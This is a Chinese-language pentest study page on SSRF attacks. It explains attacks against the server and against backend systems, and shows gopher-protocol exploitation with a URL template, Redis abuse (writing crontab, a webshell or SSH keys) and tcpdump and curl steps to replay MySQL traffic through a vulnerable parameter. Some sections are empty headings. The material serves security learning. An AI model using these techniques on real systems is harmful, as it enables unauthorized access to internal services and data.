---
description: 利用某个目标上的应用程序与目标服务器或者其他服务之间的信任关系，以达到绕过访问控制和检查、防火墙等安全措施的目的。
---

# ✔️ SSRF

## 常见类型

### 针对服务器的攻击

1. 利用应用程序对自身所在的服务器的信任，欺骗应用程序向自己发起恶意构造的请求，以达到绕过访问控制、防火墙的安全措施。
2. 利用重点：
   1. 环回接口：127.0.0.1 / localhost
   2. 利用的是**信任关系**：源自本地计算机的请求的处理方式与普通请求不同

### 针对后端系统的攻击

1. 利用应用程序，与位于目标后端的、用户无法直接访问的其他系统进行交互。
2. 利用重点：
   1. 其他后端系统的IP地址（通常是专有的）
   2. 利用的是**信任关系**：源自目标中同一网络拓扑的保护与信任，常常可无需身份验证就能访问敏感功能

## 利用各个协议和应用的攻击方法

### Gopher协议

### KEY

```bash
http://example.com/?url=gopher://目标服务IP:服务端口/URL编码的指令
```

### 攻击Redis

* Redis运行在内网，端口**6379**，一般是**空口令**
* 未授权访问后可增删改查
* 若当前启动用户是root，则可**利用redis的导出功能**写入：crontab、webshell、SSH公钥









### 攻击MySQL

#### 查User表信息

1. 现在本地创建一个空user表，路径：/pcap/mysql.pcap
2. 使用tcpdump抓包，并将结果写入mysql.pcap文件中
3. 开启抓包后，登录MySQL服务，进行一个查询操作
4. 使用wireshark打开/pcap/mysql.pcap文件，过滤出MySQL，随便选择一个包追踪TCP流
5. 将其格式调整为HEX转储，进行URL编码
6. SSRF攻击：curl "http://目标域名.com:端口/?url=gopher://mysql服务所在IP:3306/此处接上一步的URL编码" | cat

```bash
// Attacker
tcpdump -i lo port 3306 -w /pcap/mysql.pcap

mysql -h 要连接MySQL数据库服务器的主机地址 -u 连接时使用的用户名
use ssrf
select * from user;
exit

curl "http://目标域名.com:端口/?url=gopher://mysql服务所在IP:3306/此处接上一步的URL编码" | cat
```

### PHP-FPM攻击









### 攻击内网中脆弱的WEB应用

